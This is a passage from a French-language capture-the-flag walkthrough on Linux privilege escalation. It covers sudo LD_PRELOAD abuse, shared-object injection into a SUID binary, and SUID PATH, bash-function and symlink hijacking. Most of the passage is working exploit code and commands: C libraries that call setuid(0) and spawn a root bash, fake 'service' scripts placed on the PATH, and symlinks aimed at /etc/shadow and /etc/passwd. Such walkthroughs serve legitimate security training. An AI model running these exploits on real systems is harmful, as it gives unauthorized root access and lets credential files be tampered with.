<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a><span class="st">void _init() {</span></span>
<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a><span class="st">    unsetenv(&quot;LD_PRELOAD&quot;);</span></span>
<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a><span class="st">    setgid(0);</span></span>
<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a><span class="st">    setuid(0);</span></span>
<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a><span class="st">    system(&quot;/bin/bash&quot;);</span></span>
<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a><span class="st">}</span></span>
<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Compiler la bibliothèque</span></span>
<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> <span class="at">-fPIC</span> <span class="at">-shared</span> <span class="at">-o</span> /tmp/shell.so /tmp/shell.c <span class="at">-nostartfiles</span></span>
<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Exécuter n&#39;importe quelle commande sudo avec LD_PRELOAD</span></span>
<span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> LD_PRELOAD=/tmp/shell.so find</span>
<span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou avec un programme autorisé:</span></span>
<span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> LD_PRELOAD=/tmp/shell.so apache2</span>
<span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou n&#39;importe quel programme:</span></span>
<span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> LD_PRELOAD=/tmp/shell.so /usr/bin/id</span>
<span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Vérifier que vous êtes root</span></span>
<span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb18-35"><a href="#cb18-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-36"><a href="#cb18-36" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Lire le flag</span></span>
<span id="cb18-37"><a href="#cb18-37" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span>
<span id="cb18-38"><a href="#cb18-38" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-39"><a href="#cb18-39" aria-hidden="true" tabindex="-1"></a><span class="co"># ALTERNATIVE PLUS SIMPLE</span></span>
<span id="cb18-40"><a href="#cb18-40" aria-hidden="true" tabindex="-1"></a><span class="co"># Si Python est disponible</span></span>
<span id="cb18-41"><a href="#cb18-41" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /tmp/shell2.c <span class="op">&lt;&lt; EOF</span></span>
<span id="cb18-42"><a href="#cb18-42" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdio.h&gt;</span></span>
<span id="cb18-43"><a href="#cb18-43" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;sys/types.h&gt;</span></span>
<span id="cb18-44"><a href="#cb18-44" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdlib.h&gt;</span></span>
<span id="cb18-45"><a href="#cb18-45" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-46"><a href="#cb18-46" aria-hidden="true" tabindex="-1"></a><span class="st">void _init() {</span></span>
<span id="cb18-47"><a href="#cb18-47" aria-hidden="true" tabindex="-1"></a><span class="st">    unsetenv(&quot;LD_PRELOAD&quot;);</span></span>
<span id="cb18-48"><a href="#cb18-48" aria-hidden="true" tabindex="-1"></a><span class="st">    setresuid(0,0,0);</span></span>
<span id="cb18-49"><a href="#cb18-49" aria-hidden="true" tabindex="-1"></a><span class="st">    system(&quot;/bin/bash -p&quot;);</span></span>
<span id="cb18-50"><a href="#cb18-50" aria-hidden="true" tabindex="-1"></a><span class="st">}</span></span>
<span id="cb18-51"><a href="#cb18-51" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb18-52"><a href="#cb18-52" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-53"><a href="#cb18-53" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> <span class="at">-fPIC</span> <span class="at">-shared</span> <span class="at">-o</span> /tmp/shell2.so /tmp/shell2.c <span class="at">-nostartfiles</span></span>
<span id="cb18-54"><a href="#cb18-54" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> LD_PRELOAD=/tmp/shell2.so apache2</span></code></pre></div>
<h3 id="explication-technique"> Explication technique</h3>
<p><strong>LD_PRELOAD :</strong> - Variable d’environnement qui spécifie
des bibliothèques à charger avant toutes les autres - Permet de
remplacer des fonctions de bibliothèques standard - Normalement
supprimée par sudo pour la sécurité</p>
<p><strong>env_keep+=LD_PRELOAD :</strong> - Configuration sudo qui
préserve LD_PRELOAD - Permet l’exploitation</p>
<p><strong>Fonctionnement de l’exploit :</strong> 1. On crée une
bibliothèque (.so) avec une fonction <code>_init()</code> 2. Cette
fonction est exécutée au chargement de la bibliothèque 3. Elle spawn un
shell avec les privilèges du programme (root)</p>
<h3 id="vérification-de-la-vulnérabilité"> Vérification de la
vulnérabilité</h3>
<div class="sourceCode" id="cb19"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Vérifier la configuration sudo</span></span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-l</span> <span class="kw">|</span> <span class="fu">grep</span> LD_PRELOAD</span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Ou</span></span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/sudoers <span class="kw">|</span> <span class="fu">grep</span> env_keep</span></code></pre></div>
<h3 id="réponse-9"> Réponse</h3>
<p>Shell root obtenu via LD_PRELOAD</p>
<hr />
<h2
id="task-11---privilege-escalation---suid-shared-object-injection"><a name="task-11"></a>Task
11 - Privilege Escalation - SUID (Shared Object Injection)</h2>
<h3 id="objectif-10"> Objectif</h3>
<p>Exploiter un binaire SUID qui charge une bibliothèque partagée depuis
un chemin accessible en écriture.</p>
<h3 id="commandes-10"> Commandes</h3>
<div class="sourceCode" id="cb20"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Trouver les binaires SUID</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-type</span> f <span class="at">-perm</span> <span class="at">-04000</span> <span class="at">-ls</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Chercher un binaire SUID custom (souvent /usr/local/bin/suid-so)</span></span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /usr/local/bin/suid-so</span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Vérifier les bibliothèques chargées avec strace</span></span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="ex">strace</span> /usr/local/bin/suid-so <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-i</span> <span class="st">&quot;open\|access\|no such file&quot;</span></span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Chercher des lignes comme:</span></span>
<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="co"># open(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span></span>
<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. Créer le répertoire si nécessaire</span></span>
<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> /home/user/.config</span>
<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. Créer une bibliothèque malveillante</span></span>
<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> <span class="op">&gt;</span> /tmp/libcalc.c <span class="op">&lt;&lt; EOF</span></span>
<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdio.h&gt;</span></span>
<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a><span class="st">#include &lt;stdlib.h&gt;</span></span>
<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a><span class="st">static void inject() __attribute__((constructor));</span></span>
<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-23"><a href="#cb20-23" aria-hidden="true" tabindex="-1"></a><span class="st">void inject() {</span></span>
<span id="cb20-24"><a href="#cb20-24" aria-hidden="true" tabindex="-1"></a><span class="st">    setuid(0);</span></span>
<span id="cb20-25"><a href="#cb20-25" aria-hidden="true" tabindex="-1"></a><span class="st">    setgid(0);</span></span>
<span id="cb20-26"><a href="#cb20-26" aria-hidden="true" tabindex="-1"></a><span class="st">    system(&quot;/bin/bash -p&quot;);</span></span>
<span id="cb20-27"><a href="#cb20-27" aria-hidden="true" tabindex="-1"></a><span class="st">}</span></span>
<span id="cb20-28"><a href="#cb20-28" aria-hidden="true" tabindex="-1"></a><span class="op">EOF</span></span>
<span id="cb20-29"><a href="#cb20-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-30"><a href="#cb20-30" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. Compiler la bibliothèque</span></span>
<span id="cb20-31"><a href="#cb20-31" aria-hidden="true" tabindex="-1"></a><span class="fu">gcc</span> <span class="at">-shared</span> <span class="at">-fPIC</span> <span class="at">-o</span> /home/user/.config/libcalc.so /tmp/libcalc.c</span>
<span id="cb20-32"><a href="#cb20-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-33"><a href="#cb20-33" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Exécuter le binaire SUID</span></span>
<span id="cb20-34"><a href="#cb20-34" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/bin/suid-so</span></span>
<span id="cb20-35"><a href="#cb20-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-36"><a href="#cb20-36" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Vérifier que vous êtes root</span></span>
<span id="cb20-37"><a href="#cb20-37" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb20-38"><a href="#cb20-38" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb20-39"><a href="#cb20-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-40"><a href="#cb20-40" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Lire le flag</span></span>
<span id="cb20-41"><a href="#cb20-41" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span>
<span id="cb20-42"><a href="#cb20-42" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-43"><a href="#cb20-43" aria-hidden="true" tabindex="-1"></a><span class="co"># MÉTHODE ALTERNATIVE avec ldd</span></span>
<span id="cb20-44"><a href="#cb20-44" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Vérifier les dépendances</span></span>
<span id="cb20-45"><a href="#cb20-45" aria-hidden="true" tabindex="-1"></a><span class="fu">ldd</span> /usr/local/bin/suid-so</span>
<span id="cb20-46"><a href="#cb20-46" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-47"><a href="#cb20-47" aria-hidden="true" tabindex="-1"></a><span class="co"># Chercher des bibliothèques &quot;not found&quot; dans des chemins accessibles</span></span></code></pre></div>
<h3 id="outils-pour-lanalyse"> Outils pour l’analyse</h3>
<p><strong>strace :</strong></p>
<div class="sourceCode" id="cb21"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Tracer les appels système</span></span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="ex">strace</span> /path/to/binary <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;.so&quot;</span></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Chercher spécifiquement les fichiers non trouvés</span></span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="ex">strace</span> /path/to/binary <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;ENOENT&quot;</span></span></code></pre></div>
<p><strong>ldd :</strong></p>
<div class="sourceCode" id="cb22"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Lister les bibliothèques partagées</span></span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ldd</span> /path/to/binary</span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Exemple de sortie vulnérable:</span></span>
<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="co"># libcalc.so =&gt; not found</span></span></code></pre></div>
<p><strong>ltrace :</strong></p>
<div class="sourceCode" id="cb23"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Tracer les appels de bibliothèque</span></span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ltrace</span> /path/to/binary</span></code></pre></div>
<h3 id="chemins-communs-de-bibliothèques"> Chemins communs de
bibliothèques</h3>
<div class="sourceCode" id="cb24"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/lib/</span></span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/lib/</span></span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/lib/</span></span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="ex">~/.config/</span></span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="ex">/tmp/</span></span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="ex">/var/tmp/</span></span>
<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="ex">/dev/shm/</span></span></code></pre></div>
<h3 id="réponse-10"> Réponse</h3>
<p>Shell root obtenu via injection de bibliothèque partagée</p>
<hr />
<h2
id="task-12---privilege-escalation---suid-symlinks"><a name="task-12"></a>Task
12 - Privilege Escalation - SUID (Symlinks)</h2>
<h3 id="objectif-11"> Objectif</h3>
<p>Exploiter un binaire SUID qui suit les liens symboliques de manière
non sécurisée.</p>
<h3 id="commandes-11"> Commandes</h3>
<div class="sourceCode" id="cb25"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="co"># 1. Identifier les binaires SUID</span></span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-type</span> f <span class="at">-perm</span> <span class="at">-04000</span> <span class="at">-ls</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 2. Trouver le binaire vulnérable (exemple: /usr/local/bin/suid-env)</span></span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /usr/local/bin/suid-env</span>
<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 3. Analyser le binaire avec strings</span></span>
<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a><span class="fu">strings</span> /usr/local/bin/suid-env</span>
<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Chercher des appels à des commandes sans chemin absolu:</span></span>
<span id="cb25-11"><a href="#cb25-11" aria-hidden="true" tabindex="-1"></a><span class="co"># service apache2 start</span></span>
<span id="cb25-12"><a href="#cb25-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-13"><a href="#cb25-13" aria-hidden="true" tabindex="-1"></a><span class="co"># 4. MÉTHODE 1 - PATH HIJACKING</span></span>
<span id="cb25-14"><a href="#cb25-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Créer un script malveillant</span></span>
<span id="cb25-15"><a href="#cb25-15" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;/bin/bash -p&#39;</span> <span class="op">&gt;</span> /tmp/service</span>
<span id="cb25-16"><a href="#cb25-16" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /tmp/service</span>
<span id="cb25-17"><a href="#cb25-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-18"><a href="#cb25-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Modifier le PATH</span></span>
<span id="cb25-19"><a href="#cb25-19" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">PATH</span><span class="op">=</span>/tmp:<span class="va">$PATH</span></span>
<span id="cb25-20"><a href="#cb25-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-21"><a href="#cb25-21" aria-hidden="true" tabindex="-1"></a><span class="co"># Exécuter le binaire SUID</span></span>
<span id="cb25-22"><a href="#cb25-22" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/bin/suid-env</span></span>
<span id="cb25-23"><a href="#cb25-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-24"><a href="#cb25-24" aria-hidden="true" tabindex="-1"></a><span class="co"># 5. MÉTHODE 2 - SYMLINK DANS /tmp</span></span>
<span id="cb25-25"><a href="#cb25-25" aria-hidden="true" tabindex="-1"></a><span class="co"># Si le binaire utilise /tmp/somefile</span></span>
<span id="cb25-26"><a href="#cb25-26" aria-hidden="true" tabindex="-1"></a><span class="co"># Créer un lien symbolique vers un fichier sensible</span></span>
<span id="cb25-27"><a href="#cb25-27" aria-hidden="true" tabindex="-1"></a><span class="fu">ln</span> <span class="at">-sf</span> /etc/shadow /tmp/somefile</span>
<span id="cb25-28"><a href="#cb25-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-29"><a href="#cb25-29" aria-hidden="true" tabindex="-1"></a><span class="co"># Exécuter le binaire qui va modifier le fichier</span></span>
<span id="cb25-30"><a href="#cb25-30" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/bin/suid-env</span></span>
<span id="cb25-31"><a href="#cb25-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-32"><a href="#cb25-32" aria-hidden="true" tabindex="-1"></a><span class="co"># 6. MÉTHODE 3 - BASH FUNCTION (anciennes versions de bash)</span></span>
<span id="cb25-33"><a href="#cb25-33" aria-hidden="true" tabindex="-1"></a><span class="co"># Définir une fonction avec le nom d&#39;une commande</span></span>
<span id="cb25-34"><a href="#cb25-34" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span><span class="fu"> /usr/sbin/service</span> <span class="kw">{</span> <span class="ex">/bin/bash</span> <span class="at">-p</span><span class="kw">;</span> <span class="kw">}</span></span>
<span id="cb25-35"><a href="#cb25-35" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="at">-f</span> /usr/sbin/service</span>
<span id="cb25-36"><a href="#cb25-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-37"><a href="#cb25-37" aria-hidden="true" tabindex="-1"></a><span class="co"># Exécuter le binaire</span></span>
<span id="cb25-38"><a href="#cb25-38" aria-hidden="true" tabindex="-1"></a><span class="ex">/usr/local/bin/suid-env</span></span>
<span id="cb25-39"><a href="#cb25-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-40"><a href="#cb25-40" aria-hidden="true" tabindex="-1"></a><span class="co"># 7. Vérifier root</span></span>
<span id="cb25-41"><a href="#cb25-41" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
<span id="cb25-42"><a href="#cb25-42" aria-hidden="true" tabindex="-1"></a><span class="fu">whoami</span></span>
<span id="cb25-43"><a href="#cb25-43" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-44"><a href="#cb25-44" aria-hidden="true" tabindex="-1"></a><span class="co"># 8. Lire le flag</span></span>
<span id="cb25-45"><a href="#cb25-45" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /root/flag.txt</span>
<span id="cb25-46"><a href="#cb25-46" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-47"><a href="#cb25-47" aria-hidden="true" tabindex="-1"></a><span class="co"># ANALYSE DÉTAILLÉE</span></span>
<span id="cb25-48"><a href="#cb25-48" aria-hidden="true" tabindex="-1"></a><span class="co"># 9. Utiliser strace pour voir les appels</span></span>
<span id="cb25-49"><a href="#cb25-49" aria-hidden="true" tabindex="-1"></a><span class="ex">strace</span> <span class="at">-v</span> <span class="at">-f</span> <span class="at">-e</span> execve /usr/local/bin/suid-env <span class="dv">2</span><span class="op">&gt;&amp;</span><span class="dv">1</span> <span class="kw">|</span> <span class="fu">grep</span> exec</span>
<span id="cb25-50"><a href="#cb25-50" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-51"><a href="#cb25-51" aria-hidden="true" tabindex="-1"></a><span class="co"># 10. Vérifier le code source si disponible</span></span>
<span id="cb25-52"><a href="#cb25-52" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/user/tools/suid/suid-env.c</span></code></pre></div>
<h3 id="types-de-vulnérabilités-symlink"> Types de vulnérabilités
symlink</h3>
<p><strong>1. PATH Hijacking :</strong></p>
<div class="sourceCode" id="cb26"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Le binaire appelle: service apache2 start</span></span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Sans chemin absolu</span></span>
<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Créer un faux service</span></span>
<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;#!/bin/bash</span></span>
<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a><span class="st">/bin/bash -p&#39;</span> <span class="op">&gt;</span> /tmp/service</span>
<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x /tmp/service</span>
<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">PATH</span><span class="op">=</span>/tmp:<span class="va">$PATH</span></span></code></pre></div>
<p><strong>2. Relative Path :</strong></p>
<div class="sourceCode" id="cb27"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Le binaire utilise: ./script.sh</span></span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="co"># Créer un faux script</span></span>
<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&#39;#!/bin/bash</span></span>
<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="st">/bin/bash -p&#39;</span> <span class="op">&gt;</span> script.sh</span>
<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x script.sh</span></code></pre></div>
<p><strong>3. Writable Symlink :</strong></p>
<div class="sourceCode" id="cb28"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Le binaire écrit dans /tmp/log</span></span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Créer un symlink vers /etc/passwd</span></span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a><span class="fu">ln</span> <span class="at">-sf</span> /etc/passwd /tmp/log</span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="co"># Générer un hash</span></span>
<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a><span class="ex">openssl</span> passwd <span class="at">-1</span> <span class="at">-salt</span> xyz password123</span>
<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Le binaire écrit notre ligne dans /etc/passwd via le symlink</span></span></code></pre></div>
<h3 id="commandes-danalyse"> Commandes d’analyse</h3>
<div class="sourceCode" id="cb29"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Lister les binaires SUID</span></span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-perm</span> <span class="at">-u</span><span class="op">=</span>s <span class="at">-type</span> f <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Analyser avec strings</span></span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="fu">strings</span> /path/to/suid-binary</span>
<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Analyser avec ltrace</span></span>
<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a><span class="ex">ltrace</span> /path/to/suid-binary</span>
<span id="cb29-9"><a href="#cb29-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb29-10"><a href="#cb29-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Analyser avec strace</span></span>
